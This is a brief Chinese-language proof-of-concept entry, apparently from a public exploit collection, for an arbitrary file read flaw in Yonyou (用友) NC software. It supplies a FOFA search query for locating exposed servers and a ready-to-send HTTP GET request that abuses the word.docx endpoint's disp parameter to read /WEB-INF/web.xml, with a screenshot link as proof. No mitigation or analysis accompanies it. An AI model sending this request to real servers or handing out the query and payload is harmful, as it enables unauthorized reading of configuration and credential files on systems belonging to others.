
## 用友NC word.docx任意文件读取漏洞

## fofa
```
body="UClient.dmg"
```

## poc
```
GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

```

## 漏洞复现
![0152cd5a2d208fb2e336de5ac3621ebb](https://github.com/wy876/POC/assets/139549762/05dcd3bf-a6ae-4aac-95ca-e6788e2eadb0)
